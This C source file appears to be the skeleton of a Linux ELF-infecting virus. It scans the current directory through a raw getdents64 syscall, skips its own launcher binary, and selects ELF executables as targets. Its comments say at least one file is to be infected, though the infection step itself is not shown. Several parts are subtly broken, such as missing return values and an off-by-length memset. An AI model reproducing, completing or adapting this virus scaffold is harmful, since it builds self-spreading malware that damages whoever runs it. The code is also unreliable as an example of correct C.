#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <elf.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <link.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <time.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/time.h>

#define VIRUS_LAUNCHER_NAME "main"
struct linux_dirent64
{
	ino_t d_ino;			 /* 64-bit inode number */
	off_t d_off;			 /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char d_type;	 /* File type */
	char d_name[];			 /* Filename (null-terminated) */
};

int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
				unsigned int count)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $217, %%rax\n"
		"syscall" ::"g"(fd),
		"g"(dirp), "g"(count));
	asm("mov %%rax, %0"
		: "=r"(ret));
	return (int)ret;
}

void *vx(size_t len, uint8_t **mem)
{
	// PER: len=filename+directory_name+2
	// PER: mem contains the address that contains a NULL pointer
	if (*mem == NULL)
	{
		*mem = mmap(NULL, 0x200000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		// PER: **mem may be read and written, PROT_READ means protection-read, etc

		if (*mem == MAP_FAILED)
		{
			// DEBUG_PRINT("malloc failed with mmap\n");
			return;
		}
	}
	*mem += 256;
	return (void *)((char *)*mem - len);
}

char *full_path(char *exe, char *dir, uint8_t **heap)
{
	// PER: exe is the filename
	// PER: dir contains the directory name/location
	// PER: heap is contains the address that contains a NULL pointer

	char *ptr = (char *)vx(strlen(exe) + strlen(dir) + 2, heap);
	// PER: ptr contains the (address returned by malloc + 256 -(len(exec) + len(dir)+2)
	// `2` is for NULL ending of exe and dir
	// PER: vx_malloc also sets the variable `heap` to (address returned by malloc + 256)

	memset(ptr, 0, strlen(exe) + strlen(dir));
	memcpy(ptr, dir, strlen(dir));
	ptr[strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	memcpy(&ptr[strlen(dir) + 1], exe, strlen(exe));
	return ptr;
}
int check_criteria(char *filename)
{
	int fd = open(filename, O_RDONLY, 0);
	uint8_t mem[4096];
	if (fd < 0)
		return -1;
	if (read(fd, mem, 4096) < 0)
		return -1;
	close(fd);

	if (memcmp("\x7f\x45\x4c\x46", mem, 4) != 0)
		return -1;

	return 0;
}

main()
{
	char *dir = NULL, *fpath;
	uint8_t *heap = NULL;
	char dbuf[32768];
	char cwd[2] = {'.', '\0'};
	dir = cwd;
	int dd = open(dir, O_RDONLY | O_DIRECTORY, 0), nread, fcount, bpos;
	struct linux_dirent64 *d;
	// for (;;)
	// {
	nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768); // 32768 is the size of dbuf
	// PER: nread is the number of bytes read from the directory, `all files' details directly in a single `dbuf` buffer`

	// PER: error
	if (nread < 0)
	{
		return;
	}

	if (nread == 0)
		return;
	for (fcount = 0, bpos = 0; bpos < nread; bpos++)
	{
		// PER: It is ensured that atleast one healthy file(that passes the criteria) is infected
		d = (struct linux_dirent64 *)(dbuf + bpos);
		bpos += d->d_reclen - 1;
		if (!strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) // PER: linux_dirent64 of virus is 80
			continue;
		if (d->d_name[0] == '.')
			continue;

		if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
			continue; // PER: criteria not matched, move on to next file in the directory
	}
	// }
}
